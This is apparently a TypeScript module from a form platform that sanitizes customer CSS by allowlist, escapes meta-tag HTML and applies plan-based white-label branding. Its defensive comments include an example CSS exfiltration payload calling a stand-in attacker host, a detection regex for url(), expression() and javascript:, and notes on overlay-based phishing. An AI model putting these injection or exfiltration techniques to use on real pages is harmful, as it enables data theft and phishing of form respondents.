/**
 * White-label por organização (seção 8.5).
 *
 * Três coisas moram aqui, e a primeira é a que exige cuidado:
 *
 *  **CSS customizado.** É texto escrito por um cliente que acaba dentro de uma
 *  tag `<style>` numa página que nós servimos. Se ele conseguir fechar a tag,
 *  vira XSS — e não só no domínio do próprio cliente: o mesmo formulário é
 *  servido em `<app>/f/<slug>`, o domínio onde vivem as sessões de todo mundo.
 *
 *  **Meta tags.** Título da aba e prévia do link. Valores vindos do banco que
 *  são interpolados em HTML, então escapados aqui e não na tela.
 *
 *  **Remoção da marca.** Pro+ some com o "Feito com …". A decisão é do plano,
 *  em um lugar só, para a tela e o backend contarem a mesma história.
 */

// -----------------------------------------------------------------------------
// CSS customizado
// -----------------------------------------------------------------------------

/**
 * Propriedades aceitas.
 *
 * Lista de permissão, não de bloqueio: o conjunto de propriedades CSS cresce a
 * cada versão dos navegadores, e uma lista de bloqueio ficaria desatualizada
 * sozinha. O que não está aqui não passa, e isso é uma decisão consciente —
 * pedido de propriedade nova é linha nesta lista, com quem revisa olhando.
 *
 * Ausências deliberadas:
 *
 *  - `position`: `fixed` cobre a página inteira, e uma sobreposição em cima de
 *    um formulário é a receita de um phishing convincente.
 *  - `content`: injeta texto que não está no formulário, incluindo texto que
 *    contradiz o rótulo do campo ao lado.
 *  - `behavior`, `-moz-binding`, `filter`: executam script em navegadores
 *    antigos. `filter` moderno é inofensivo, mas o nome colide com o do IE.
 *  - `cursor`, `pointer-events`: escondem que um elemento é clicável.
 */
const PROPRIEDADES_PERMITIDAS = new Set([
  'align-items',
  'align-self',
  'background',
  'background-color',
  'border',
  'border-bottom',
  'border-bottom-color',
  'border-bottom-left-radius',
  'border-bottom-right-radius',
  'border-bottom-style',
  'border-bottom-width',
  'border-color',
  'border-left',
  'border-radius',
  'border-right',
  'border-style',
  'border-top',
  'border-top-color',
  'border-top-left-radius',
  'border-top-right-radius',
  'border-width',
  'box-shadow',
  'box-sizing',
  'color',
  'column-gap',
  'display',
  'flex',
  'flex-basis',
  'flex-direction',
  'flex-grow',
  'flex-shrink',
  'flex-wrap',
  'font-family',
  'font-size',
  'font-style',
  'font-weight',
  'gap',
  'grid-template-columns',
  'height',
  'justify-content',
  'justify-items',
  'letter-spacing',
  'line-height',
  'margin',
  'margin-bottom',
  'margin-left',
  'margin-right',
  'margin-top',
  'max-height',
  'max-width',
  'min-height',
  'min-width',
  'opacity',
  'outline',
  'outline-color',
  'outline-offset',
  'outline-width',
  'padding',
  'padding-bottom',
  'padding-left',
  'padding-right',
  'padding-top',
  'row-gap',
  'text-align',
  'text-decoration',
  'text-transform',
  'transition',
  'vertical-align',
  'white-space',
  'width',
  'word-break',
]);

/** At-rules aceitas. `@import` e `@font-face` puxam recurso externo: fora. */
const AT_RULES_PERMITIDAS = new Set(['media', 'supports', 'keyframes']);

/**
 * Trechos que reprovam um valor onde quer que apareçam.
 *
 * `url(` cobre exfiltração — `background: url(https://atacante/?c=…)` dispara
 * um GET com o que estiver na URL só de a regra casar. `\` cobre escapes CSS,
 * que codificam qualquer um dos outros (`\75 rl(` é `url(`).
 */
const VALOR_PROIBIDO = /url\s*\(|expression\s*\(|javascript\s*:|@import|\\|<|&#/i;

/** Caracteres que um seletor pode usar. Note que `<` não está entre eles. */
const SELETOR_VALIDO = /^[a-zA-Z0-9_\-.#:[\]="'()>+~*,\s|^$]+$/;

const NOME_DE_PROPRIEDADE = /^-{0,2}[a-z][a-z0-9-]*$/;

export const CSS_TAMANHO_MAXIMO = 20_000;

export interface CssSanitizado {
  css: string;
  /** O que foi removido, em português, para a tela explicar ao cliente. */
  removidos: string[];
}

/**
 * Devolve apenas o CSS que passou na lista de permissão.
 *
 * Nunca lança e nunca devolve entrada crua: o pior caso é uma folha vazia. Uma
 * exceção aqui viraria formulário fora do ar por causa de uma chave sem par.
 */
export function sanitizeCustomCss(entrada: string): CssSanitizado {
  const removidos: string[] = [];

  if (!entrada || entrada.trim() === '') return { css: '', removidos };

  if (entrada.length > CSS_TAMANHO_MAXIMO) {
    removidos.push(`O CSS passa de ${CSS_TAMANHO_MAXIMO} caracteres e foi cortado.`);
    entrada = entrada.slice(0, CSS_TAMANHO_MAXIMO);
  }

  const semComentarios = entrada.replace(/\/\*[\s\S]*?\*\//g, ' ');
  const saida = sanitizarBlocos(semComentarios, removidos, 0);

  return { css: saida.join('\n'), removidos: [...new Set(removidos)] };
}

/** Varre um nível de blocos `prelúdio { corpo }`, respeitando aninhamento. */
function sanitizarBlocos(fonte: string, removidos: string[], profundidade: number): string[] {
  // Três níveis já cobrem `@media { @supports { regra } }`. Mais do que isso é
  // entrada construída para cansar o parser, não folha de estilo.
  if (profundidade > 3) {
    removidos.push('Blocos aninhados demais foram removidos.');
    return [];
  }

  const resultado: string[] = [];
  let i = 0;
  let inicioDoPreludio = 0;

  while (i < fonte.length) {
    const caractere = fonte[i];

    if (caractere === '{') {
      const preludio = fonte.slice(inicioDoPreludio, i).trim();
      const fim = acharFechamento(fonte, i);

      if (fim === -1) {
        // Chave sem par: o resto do arquivo é lixo, não dá para confiar nele.
        removidos.push('Há uma chave `{` sem fechamento. O trecho a partir dela foi ignorado.');
        return resultado;
      }

      const corpo = fonte.slice(i + 1, fim);
      const bloco = sanitizarBloco(preludio, corpo, removidos, profundidade);
      if (bloco) resultado.push(bloco);

      i = fim + 1;
      inicioDoPreludio = i;
      continue;
    }

    // At-rule sem bloco (`@import "…";`) termina em ponto e vírgula.
    if (caractere === ';') {
      const solto = fonte.slice(inicioDoPreludio, i).trim();
      if (solto.startsWith('@')) {
        removidos.push(`A regra \`${primeiraPalavra(solto)}\` não é permitida.`);
      }
      i += 1;
      inicioDoPreludio = i;
      continue;
    }

    i += 1;
  }

  return resultado;
}

function sanitizarBloco(
  preludio: string,
  corpo: string,
  removidos: string[],
  profundidade: number,
): string | null {
  if (preludio.startsWith('@')) {
    const nome = preludio.slice(1).split(/[\s({]/)[0]?.toLowerCase() ?? '';

    if (!AT_RULES_PERMITIDAS.has(nome)) {
      removidos.push(`A regra \`@${nome}\` não é permitida.`);
      return null;
    }
    if (!SELETOR_VALIDO.test(preludio.slice(1)) || VALOR_PROIBIDO.test(preludio)) {
      removidos.push(`A condição de \`@${nome}\` tem caracteres que não aceitamos.`);
      return null;
    }

    const interno = sanitizarBlocos(corpo, removidos, profundidade + 1);
    // `@keyframes` tem blocos internos (`from`, `50%`); `@media` tem regras.
    // Os dois caem no mesmo caminho, e um corpo vazio some junto com a regra.
    if (interno.length === 0) return null;

    return `${preludio} {\n${interno.join('\n')}\n}`;
  }

  if (preludio === '') return null;

  if (!SELETOR_VALIDO.test(preludio) || VALOR_PROIBIDO.test(preludio)) {
    removidos.push('Um seletor com caracteres que não aceitamos foi removido.');
    return null;
  }

  const declaracoes = sanitizarDeclaracoes(corpo, removidos);
  if (declaracoes.length === 0) return null;

  return `${normalizarEspacos(preludio)} { ${declaracoes.join(' ')} }`;
}

function sanitizarDeclaracoes(corpo: string, removidos: string[]): string[] {
  const aceitas: string[] = [];

  for (const bruta of corpo.split(';')) {
    const declaracao = bruta.trim();
    if (declaracao === '') continue;

    const separador = declaracao.indexOf(':');
    if (separador === -1) continue;

    const propriedade = declaracao.slice(0, separador).trim().toLowerCase();
    const valor = declaracao.slice(separador + 1).trim();

    if (!NOME_DE_PROPRIEDADE.test(propriedade) || !PROPRIEDADES_PERMITIDAS.has(propriedade)) {
      removidos.push(`A propriedade \`${propriedade}\` não é permitida.`);
      continue;
    }
    if (valor === '' || valor.length > 500) {
      removidos.push(`O valor de \`${propriedade}\` é longo demais.`);
      continue;
    }
    if (VALOR_PROIBIDO.test(valor)) {
      removidos.push(`O valor de \`${propriedade}\` usa algo que não aceitamos (por exemplo \`url()\`).`);
      continue;
    }
    // `!important` numa folha do cliente sobrescreve estilo de acessibilidade
    // e estado de erro. A folha do cliente vem depois da nossa; ela já ganha.
    const semImportante = valor.replace(/!\s*important/gi, '').trim();
    if (semImportante === '') continue;

    aceitas.push(`${propriedade}: ${normalizarEspacos(semImportante)};`);
  }

  return aceitas;
}

/** Índice da `}` que fecha a `{` em `abertura`, ou -1. */
function acharFechamento(fonte: string, abertura: number): number {
  let nivel = 0;
  for (let i = abertura; i < fonte.length; i++) {
    if (fonte[i] === '{') nivel += 1;
    else if (fonte[i] === '}') {
      nivel -= 1;
      if (nivel === 0) return i;
    }
  }
  return -1;
}

function normalizarEspacos(texto: string): string {
  return texto.replace(/\s+/g, ' ').trim();
}

function primeiraPalavra(texto: string): string {
  return texto.split(/[\s({]/)[0] ?? texto;
}

// -----------------------------------------------------------------------------
// Meta tags
// -----------------------------------------------------------------------------

/**
 * Escapa para interpolação em HTML.
 *
 * Vale tanto para conteúdo de elemento quanto para valor de atributo entre
 * aspas duplas, que é onde estes valores acabam.
 */
export function escapeHtml(valor: string): string {
  return valor
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

export interface MetaTag {
  /** `name` para meta comum, `property` para Open Graph. */
  attr: 'name' | 'property';
  key: string;
  content: string;
}

export interface MetaInput {
  formTitle: string;
  formDescription?: string | null;
  organizationName: string;
  metaTitle?: string | null;
  metaDescription?: string | null;
  ogImageUrl?: string | null;
  faviconUrl?: string | null;
  canonicalUrl?: string | null;
  /** Falso nos planos Pro+: nada de assinatura da plataforma na prévia. */
  showBranding: boolean;
  productName: string;
}

const DESCRICAO_MAXIMA = 200;

/**
 * Monta título e meta tags do formulário público.
 *
 * A prévia do link importa mais do que parece: no Brasil, formulário circula
 * por WhatsApp, e o cartão da prévia é a primeira coisa que o respondente vê.
 */
export function buildMetaTags(entrada: MetaInput): { title: string; tags: MetaTag[] } {
  const titulo = (entrada.metaTitle?.trim() || entrada.formTitle).slice(0, 120);

  // Sem a marca do produto quando o white-label está ativo: a página é do
  // cliente, e o respondente não tem nada com quem hospeda o formulário.
  const tituloDaAba = entrada.showBranding ? `${titulo} · ${entrada.productName}` : titulo;

  const descricao = (entrada.metaDescription?.trim() || entrada.formDescription?.trim() || '').slice(
    0,
    DESCRICAO_MAXIMA,
  );

  const tags: MetaTag[] = [
    { attr: 'property', key: 'og:title', content: titulo },
    { attr: 'property', key: 'og:type', content: 'website' },
    { attr: 'property', key: 'og:site_name', content: entrada.organizationName },
    { attr: 'name', key: 'twitter:card', content: entrada.ogImageUrl ? 'summary_large_image' : 'summary' },
  ];

  if (descricao) {
    tags.push({ attr: 'name', key: 'description', content: descricao });
    tags.push({ attr: 'property', key: 'og:description', content: descricao });
  }
  if (entrada.ogImageUrl) {
    tags.push({ attr: 'property', key: 'og:image', content: entrada.ogImageUrl });
  }
  if (entrada.canonicalUrl) {
    tags.push({ attr: 'property', key: 'og:url', content: entrada.canonicalUrl });
  }

  // Formulário não é conteúdo para buscador, e um link que circula por WhatsApp
  // indexado é vazamento de contexto que o cliente não pediu.
  tags.push({ attr: 'name', key: 'robots', content: 'noindex, nofollow' });

  return { title: tituloDaAba, tags };
}

export interface MetaResolvido {
  title: string;
  tags: MetaTag[];
  faviconUrl?: string | null;
}

/**
 * As mesmas tags, já como HTML escapado, para o shell servido pela API.
 *
 * Recebe o resultado de `buildMetaTags` em vez de recalculá-lo: o que vai na
 * página e o que vai na resposta JSON precisam ser a mesma coisa, e duas
 * chamadas independentes seriam duas chances de divergir.
 */
export function renderMetaTags(resolvido: MetaResolvido): string {
  const linhas = [`<title>${escapeHtml(resolvido.title)}</title>`];

  for (const tag of resolvido.tags) {
    linhas.push(`<meta ${tag.attr}="${escapeHtml(tag.key)}" content="${escapeHtml(tag.content)}">`);
  }

  if (resolvido.faviconUrl) {
    linhas.push(`<link rel="icon" href="${escapeHtml(resolvido.faviconUrl)}">`);
  }

  return linhas.join('\n');
}

// -----------------------------------------------------------------------------
// Branding efetivo
// -----------------------------------------------------------------------------

export interface OrganizationBranding {
  name: string;
  logoUrl: string | null;
  faviconUrl: string | null;
  primaryColor: string | null;
  metaTitle: string | null;
  metaDescription: string | null;
  ogImageUrl: string | null;
  customCss: string | null;
}

export interface PlanoDeBranding {
  removeBranding: boolean;
  customCss: boolean;
}

export interface BrandingEfetivo extends OrganizationBranding {
  /** `false` some com o "Feito com …" do rodapé do formulário. */
  showBranding: boolean;
  /** Já sanitizado, e vazio quando o plano não inclui CSS customizado. */
  customCss: string;
}

/**
 * O que o renderizador público realmente aplica.
 *
 * O plano é aplicado AQUI e não na tela: um cliente que baixou de plano tem o
 * CSS preservado no banco — para voltar se ele reassinar — mas ele para de ser
 * servido no mesmo instante. Guardar e aplicar são decisões diferentes.
 */
export function effectiveBranding(
  organizacao: OrganizationBranding,
  plano: PlanoDeBranding,
): BrandingEfetivo {
  return {
    ...organizacao,
    showBranding: !plano.removeBranding,
    customCss: plano.customCss && organizacao.customCss ? sanitizeCustomCss(organizacao.customCss).css : '',
  };
}

/** Cor de marca aceita: `#RRGGBB`. Nada de `red`, `var()` ou `url()`. */
export function isValidBrandColor(valor: string): boolean {
  return /^#[0-9a-fA-F]{6}$/.test(valor.trim());
}

/**
 * URL de imagem aceita para logo, favicon e prévia.
 *
 * Só https. Um logo em http numa página https vira aviso de conteúdo misto no
 * navegador do respondente — e a página é do cliente, não nossa.
 */
export function isValidAssetUrl(valor: string): boolean {
  try {
    const url = new URL(valor.trim());
    return url.protocol === 'https:' && valor.length <= 2048;
  } catch {
    return false;
  }
}
